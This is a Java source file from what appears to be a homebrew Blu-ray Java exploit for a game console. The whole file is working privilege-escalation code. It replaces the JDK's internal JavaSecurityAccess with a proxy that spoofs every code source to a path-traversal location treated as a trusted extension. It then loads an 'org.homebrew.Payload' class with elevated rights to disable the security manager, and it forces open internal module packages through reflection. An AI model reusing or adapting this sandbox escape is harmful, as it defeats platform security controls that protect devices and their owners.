package org.homebrew;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.ByteBuffer;
import java.security.AccessControlContext;
import java.security.AccessController;
import java.security.CodeSource;
import java.security.GeneralSecurityException;
import java.security.KeyStore;
import java.security.KeyStoreException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.Permission;
import java.security.PermissionCollection;
import java.security.PrivilegedAction;
import java.security.PrivilegedActionException;
import java.security.PrivilegedExceptionAction;
import java.security.ProtectionDomain;
import java.security.Provider;
import java.util.HashSet;
import java.util.Iterator;
import java.util.Map;
import java.util.Set;
import jdk.internal.access.JavaSecurityAccess;
import jdk.internal.access.SharedSecrets;
import jdk.internal.security.CodeSigner;
import jdk.internal.security.Entry;
import jdk.internal.security.ProtectionParameter;
import jdk.internal.security.Service;
import jdk.internal.security.keystore.Builder;

public class PrivilegeEscalation  {
    private static final JavaSecurityAccess real = SharedSecrets.getJavaSecurityAccess();

    static class JavaSecurityAccessProxy implements JavaSecurityAccess {

	public Object doIntersectionPrivilege(PrivilegedAction action, AccessControlContext ctx1, AccessControlContext ctx2) {
	    return real.doIntersectionPrivilege(action, ctx1, ctx2);
	}

	public Object doIntersectionPrivilege(PrivilegedAction action, AccessControlContext ctx) {
	    return real.doIntersectionPrivilege(action, ctx);
	}

	public ProtectionDomainCache getProtectionDomainCache() {
	    return real.getProtectionDomainCache();
	}

	public Object doPrivilegedWithCombiner(PrivilegedExceptionAction action, AccessControlContext ctx, Permission[] perms) throws PrivilegedActionException {
	    return real.doPrivilegedWithCombiner(action, ctx, perms);
	}

	public Object doPrivileged(PrivilegedAction action, AccessControlContext ctx, Permission[] perms) {
	    return real.doPrivileged(action, ctx, perms);
	}

	public Entry getEntry(KeyStore ks, String str, ProtectionParameter pp) throws NoSuchAlgorithmException, GeneralSecurityException {
	    return real.getEntry(ks, str, pp);
	}

	public Service getService(Provider provider, String str1, String str2) {
	    return real.getService(provider, str1, str2);
	}

	public void putService(Provider provider, Service service) {
	    real.putService(provider, service);
	}

	public Set getServices(Provider provider) {
	    return real.getServices(provider);
	}

	public Provider configure(Provider provider, String str) {
	    return real.configure(provider, str);
	}

	public Object newInstance(Class clazz, String str, Object obj) throws Exception {
	    return real.newInstance(clazz, str, obj);
	}

	public boolean checkEngine(String str) {
	    return real.checkEngine(str);
	}

	public String getEngineName(String str) {
	    return real.getEngineName(str);
	}

	public CodeSource newCodeSource(URL url, CodeSigner[] cs) {
	    try {
		url = new URL("file:///app0/cdc/lib/ext/../../../../VP/BDMV/JAR/00000.jar");
	    } catch (Throwable t) {
	    }

	    return real.newCodeSource(url, cs);
	}

	public void update(MessageDigest md, ByteBuffer bb) {
	    real.update(md, bb);
	}

	public Builder newKeyStoreBuilder(KeyStore ks, ProtectionParameter pp) {
	    return real.newKeyStoreBuilder(ks, pp);
	}
    }

    public static boolean disableSecurityManager() {
	try {
	    JavaSecurityAccessProxy proxy = new JavaSecurityAccessProxy();
	    SharedSecrets.setJavaSecurityAccess(proxy);
	    ClassLoader loader = URLClassLoader.newInstance(new URL[]{new URL("file:///VP/BDMV/JAR/00000.jar")});
	    loader.loadClass("org.homebrew.Payload").newInstance();
	    SharedSecrets.setJavaSecurityAccess(real);
	    return true;
	} catch (Throwable t) {
	    LoggingUI.getInstance().log(t);
	    return false;
	}
    }

    public static boolean openModulePackage(String moduleName, String packageName, Class clazz) {
	try {
	    Method getModule = Class.class.getDeclaredMethod("getModule", new Class[0]);
	    Field openPackages = Module.class.getDeclaredField("openPackages");

	    openPackages.setAccessible(true);
	    getModule.setAccessible(true);

	    Module classModule = (Module)getModule.invoke(clazz);
	    for(Module module : ModuleLayer.boot().modules()) {
		if(moduleName.equals(module.getName())) {
		    Map pkgs = (Map)openPackages.get(module);
		    Set own = new HashSet();
		    own.add(classModule);
		    pkgs.put(packageName, own);
		    return true;
		}
	    }
	} catch (Throwable t) {
	    LoggingUI.getInstance().log(t);
	}
	return false;
    }
}
